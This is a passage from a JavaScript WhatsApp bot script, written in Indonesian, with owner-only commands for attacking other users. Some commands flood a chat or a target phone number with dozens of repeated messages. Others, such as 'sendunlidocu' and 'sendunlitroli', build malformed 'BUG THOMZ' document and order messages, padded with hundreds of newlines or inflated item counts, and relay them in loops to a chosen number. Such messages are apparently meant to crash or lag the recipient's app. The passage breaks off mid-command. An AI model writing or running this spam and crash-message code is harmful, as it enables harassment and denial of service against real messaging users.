await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
}
break
//=================================================//
case 'unlibom' :  {
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
 if (!text) return reply(`penggunaan salah thomz harusnya ${prefix+command} 628xxx `)
 await reply(mess.wait)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: weg}, {quoted:thomz})
await sleep(2000)
}
break
//=================================================//
case 'unlicuy' :  {
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
 if (!text) return reply(`penggunaan salah thomz harusnya ${prefix+command} 628xxx `)
 await reply(mess.wait)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: tizi}, {quoted:thomz})
await sleep(2000)
}
break
//=================================================//
case 'unlidocu': {
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
 if (!text) return reply(`penggunaan salah thomz harusnya ${prefix+command} 628xxx `)
 await reply(mess.wait)
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "BUG THOMZ",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `${botname}⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.BUG THOMZ`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ${botname} ${buttonkal}`,
}

}), { userJid: from, quoted:thomz})
haikal.relayMessage(from, document.message, { messageId: document.key.id })
}
await sleep(2000)
}
break

//=================================================//
case 'unlitroli': {
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
 if (!text) return reply(`penggunaan salah thomz harusnya ${prefix+command} 628xxx `)
 await reply(mess.wait)
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${botname}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " BUG BY THOMZ ", // 
"sellerJid": "628388072690@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted : m})
haikal.relayMessage(from, order.message, { messageId: order.key.id })
}
await sleep(2000)
}
break
//=================================================//
case 'unlivirtext' :  {
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
 if (!text) return reply(`penggunaan salah thomz harusnya ${prefix+command} 628xxx `)
 await reply(mess.wait)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(from, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
}
break
//=================================================//
case 'sendunlidocu': {
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
if (args.length < 1) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "BUG THOMZ",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `${botname}⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.BUG THOMZ`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ${botname} ${buttonkal}`,
}

}), { userJid: from, quoted:thomz})
haikal.relayMessage(bnnd, document.message, { messageId: document.key.id })
}
m.reply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
}
break
//=================================================//
case 'sendunlitroli': {
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx|5`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${botname}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": fkethmb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " BUG BY THOMZ ", // 
"sellerJid": "628388072690@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:thomz})
haikal.relayMessage(bnnd, order.message, { messageId: order.key.id })
}
m.reply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
}
break
//=================================================//
case 'santet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': {
  if (!isOwner) return m.reply('*khusus Bang Thomz*')
 if (!text) return reply(`penggunaan salah thomz harusnya ${prefix+command} 628xxx `)
 await reply(mess.wait)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case '🗿': case '🥔': case '🌰': case '🎂': case '🍆': case '🥑': case '🥒': case '🥦': case '🌽': case '🍠': case '🥕': case '🌶️': case '🍅': case '🥥': case '🍇': case '🥝': case '🍐': case '🍏': case '🍈': case '🍋': case '🍌': case '🍍': case '🍊': case '🍑': case '🍉': case '🍎': case '🍒️': case '🍓': case '🍄': case '🌻': case '🏵️': case '💮': case '🌸': case '🌺': case '🥀': case '🌹': case '🤯': case '🖕': case '🤙': case '💋': case '💦': case '💩': case '👿': case '👻': case '🤡': case '🤮': case '😇': case '😠': case '😭': case '🔥': case '😎': case '😜': case '😡': case '🤫': case '❤️': case '😱': case '🤣': case '😂': case '😘': case '💔': case '👊': {
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx|5`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "BUG THOMZ",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
